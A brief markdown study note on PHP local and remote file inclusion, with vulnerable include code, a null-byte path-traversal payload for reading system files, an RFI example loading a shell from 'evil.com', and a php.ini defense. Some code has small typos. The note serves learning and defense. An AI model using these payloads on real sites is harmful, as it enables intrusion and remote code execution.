# File Inclusion

## Local File Inclusion (LFI)

Custom scripts where path characters are not stripped from input, and input is used as part of an `include` statement

E.g. for vulnerable URL `http://target.site/index.php?location=IT`
The PHP code handles the parameter as follows
```php
<?php include("loc/" . $_GET['location']); ?>
```

### Using Null byte example

In some cases the code for handling may inlcude a file type, in this case we can use Null byte (%00) to ignore the strings after it

```php
<?php include (%_GET['location'] . "/template.tlp"); ?>
```

Exploit: `index.php?location=../../../etc/password%00`



## Remote File Inclusion (RFI)
Works same way as LFI, only difference is the file to be included is pulled remotely. 

Note: when testing for RFI it is important to note that the file to be read should be to include our own code in the execution. E.g.  `vuln.php?page=http://evil.com/shell.txt`

	It is important to note that file to include must not have the .php extension; otherwise, the code within the included file will run on the attacker machine, instead of the target web application.

### Defense 

For PHP. Disable `allow_url_include` directive by setting to `Off` in `php.ini`